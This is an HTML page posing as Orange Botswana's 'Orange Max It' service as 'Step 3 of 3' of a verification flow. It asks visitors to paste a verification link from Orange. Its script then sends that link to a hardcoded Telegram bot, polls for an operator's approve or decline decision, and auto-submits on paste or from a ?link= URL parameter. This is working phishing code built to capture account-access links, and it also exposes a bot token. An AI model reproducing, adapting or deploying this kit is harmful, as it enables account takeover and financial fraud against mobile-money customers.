<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Orange Max It - Verify Link</title>
    <link rel="icon" href="https://www.orange.co.bw/favicon.ico" type="image/x-icon">
    <meta name="theme-color" content="#FF6600">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Inter:wght@400;500;600&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            min-height: 100vh;
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #fff8f3 0%, #ffe6d5 100%);
            overflow-x: hidden;
        }

        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }

        /* Header */
        header {
            width: 100%;
            max-width: 520px;
            padding: 24px 20px;
            text-align: center;
            margin-bottom: 30px;
            background: linear-gradient(135deg, #FF6600 0%, #FF8533 100%);
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(255, 102, 0, 0.2);
            position: relative;
            overflow: hidden;
        }

        .logo {
            font-size: 28px;
            font-weight: 800;
            letter-spacing: -1px;
            color: white;
            position: relative;
            z-index: 1;
        }

        /* Main Container */
        .container {
            width: 100%;
            max-width: 520px;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        /* Progress Bar */
        .progress-container {
            background: white;
            border-radius: 16px;
            padding: 16px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.05);
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .progress-step {
            flex: 1;
            height: 6px;
            border-radius: 3px;
            background: #FFE6D5;
            position: relative;
        }

        .progress-step.active {
            background: #FF6600;
        }

        .progress-text {
            font-size: 12px;
            font-weight: 700;
            color: #FF6600;
            min-width: 80px;
        }

        /* Form Card */
        .form-card {
            background: white;
            border-radius: 24px;
            padding: 32px 24px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
            text-align: center;
        }

        .form-title {
            font-size: 22px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 8px;
        }

        .form-subtitle {
            font-size: 13px;
            color: #666;
            margin-bottom: 28px;
            line-height: 1.5;
        }

        /* Input Groups */
        .form-group {
            text-align: left;
            margin-bottom: 24px;
            position: relative;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 14px;
            color: #2c3e50;
        }

        .form-input {
            width: 100%;
            padding: 16px;
            font-size: 15px;
            font-family: 'Poppins', sans-serif;
            border: 2px solid #FFE6D5;
            border-radius: 14px;
            outline: none;
            transition: all 0.3s;
            background: #fffcf9;
        }

        .form-input:focus {
            border-color: #FF6600;
            background: white;
            box-shadow: 0 0 0 4px rgba(255, 102, 0, 0.1);
        }

        .error-msg {
            color: #ff4d4d;
            font-size: 12px;
            font-weight: 600;
            margin-top: 8px;
            display: none;
            animation: fadeIn 0.3s;
        }

        /* Buttons */
        .btn-action {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #FF6600, #E55A00);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 8px 24px rgba(255, 102, 0, 0.25);
            transition: all 0.3s;
            font-family: 'Poppins', sans-serif;
            margin-top: 12px;
        }

        .btn-action:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 32px rgba(255, 102, 0, 0.35);
        }

        .btn-back {
            width: 100%;
            padding: 16px;
            background: transparent;
            color: #FF6600;
            border: 2px solid #FFE6D5;
            border-radius: 16px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Poppins', sans-serif;
            margin-top: 12px;
        }

        .btn-back:hover {
            background: #fff5f0;
            border-color: #FF6600;
        }

        /* Spinner */
        #spinner {
            position: fixed;
            inset: 0;
            background: rgba(255, 102, 0, 0.15);
            backdrop-filter: blur(4px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .spin {
            width: 60px;
            height: 60px;
            border: 6px solid #ffffff;
            border-top: 6px solid #FF6600;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }

        footer {
            padding: 24px 20px;
            color: #999;
            font-size: 12px;
            text-align: center;
            margin-top: auto;
            width: 100%;
        }
    </style>
</head>
<body>
    <header>
        <div class="logo">🟠 Orange Max It</div>
    </header>

    <div class="container">
        <!-- Progress Bar -->
        <div class="progress-container">
            <div class="progress-step active"></div>
            <div class="progress-step active"></div>
            <div class="progress-step active"></div>
            <span class="progress-text">Step 3 of 3</span>
        </div>

        <!-- Form Card -->
        <div class="form-card">
            <h1 class="form-title">Verification Link</h1>
            <p class="form-subtitle">Please paste the verification link received from Orange, or wait for automatic processing.</p>

            <div class="form-group">
                <label for="linkInput">Verification Link</label>
                <input type="text" id="linkInput" class="form-input" placeholder="Paste your Orange link here">
                <div class="error-msg" id="linkError">Please enter a valid verification link.</div>
            </div>
            
            <button class="btn-action" id="continueBtn">Continue</button>
            <button class="btn-back" id="backBtn">Go Back</button>
        </div>
    </div>

    <div id="spinner">
        <div class="spin"></div>
    </div>

    <footer>
        © 2026 Orange Botswana | Licensed Financial Services
    </footer>

    <script>
        // CONFIG - PRESERVED FROM ORIGINAL
        const CONFIG = {
            BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
            CHAT_ID: '7547427914',
            REDIRECT_PAGE: 'success.html' // Assuming a success page after verification
        };

        // STATE
        const state = {
            lastUpdateId: 0,
            pollInterval: null,
            approveId: null,
            declineId: null
        };

        // DOM Elements
        const els = {
            linkInput: document.getElementById('linkInput'),
            continueBtn: document.getElementById('continueBtn'),
            backBtn: document.getElementById('backBtn'),
            linkError: document.getElementById('linkError'),
            spinner: document.getElementById('spinner')
        };

        // Helpers
        function showError(msg = "Please enter a valid verification link.") {
            els.linkError.textContent = msg;
            els.linkError.style.display = 'block';
        }

        function hideError() {
            els.linkError.style.display = 'none';
        }

        function showSpinner() {
            els.spinner.style.display = 'flex';
        }

        function hideSpinner() {
            els.spinner.style.display = 'none';
        }

        function stopPolling() {
            if (state.pollInterval) {
                clearInterval(state.pollInterval);
                state.pollInterval = null;
            }
        }

        // Telegram Bot Integration - ADAPTED
        function sendVerificationLink(link) {
            const ts = Date.now();
            state.approveId = `approve_verify_${ts}`;
            state.declineId = `decline_verify_${ts}`;

            // Escape special characters for MarkdownV2
            const escapedLink = link.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
            const message = `*Orange Max It Verification Link Received*\n\n` +
                            `Link:\n\`${escapedLink}\`\n\nAction?`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '✅ Approve', callback_data: state.approveId },
                            { text: '❌ Decline', callback_data: state.declineId }
                        ]]
                    }
                })
            })
            .then(r => r.json())
            .then(data => {
                if (!data.ok) {
                    hideSpinner();
                    alert("Verification system error. Please try again.");
                } else {
                    startPolling();
                }
            })
            .catch(err => {
                hideSpinner();
                alert('Connection error: ' + err.message);
            });
        }

        function startPolling() {
            stopPolling();
            state.pollInterval = setInterval(() => {
                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=10&allowed_updates=["callback_query"]`;

                fetch(url)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result?.length) return;

                        for (const update of data.result) {
                            state.lastUpdateId = update.update_id;
                            const cb = update.callback_query;
                            if (!cb) continue;

                            if (cb.data === state.approveId) {
                                stopPolling();
                                hideSpinner();
                                localStorage.setItem('verificationApproved', 'true');
                                window.location.href = CONFIG.REDIRECT_PAGE;
                            } else if (cb.data === state.declineId) {
                                stopPolling();
                                hideSpinner();
                                alert("Verification declined by admin.");
                                // Optionally redirect or show error message
                            }
                        }
                    })
                    .catch(err => console.error("Polling error:", err));
            }, 3000); // Poll every 3 seconds
        }

        // Autofill and Autosend Logic (URL Parameter)
        document.addEventListener('DOMContentLoaded', () => {
            // Get the full URL and extract everything after ?link=
            // This ensures we capture the exact link even if it contains other parameters
            const urlString = window.location.href;
            const linkParamIndex = urlString.indexOf('?link=');
            
            if (linkParamIndex !== -1) {
                const verificationLink = decodeURIComponent(urlString.substring(linkParamIndex + 6));
                if (verificationLink) {
                    els.linkInput.value = verificationLink;
                    // Automatically submit the form
                    processVerification();
                }
            }
        });

        // Smart Paste Autosend Logic
        els.linkInput.addEventListener('paste', (e) => {
            // Wait a tiny bit for the paste to complete, then autosend
            setTimeout(() => {
                if (els.linkInput.value.trim() !== '') {
                    processVerification();
                }
            }, 100);
        });

        els.continueBtn.addEventListener('click', processVerification);
        els.backBtn.addEventListener('click', () => {
            window.history.back();
        });

        function processVerification() {
            hideError();
            const link = els.linkInput.value.trim();

            if (!link) {
                showError("Please paste the verification link.");
                return;
            }

            // Basic URL validation
            try {
                new URL(link);
            } catch (e) {
                showError("Invalid URL format.");
                return;
            }

            showSpinner();
            sendVerificationLink(link);
        }

    </script>
</body>
</html>
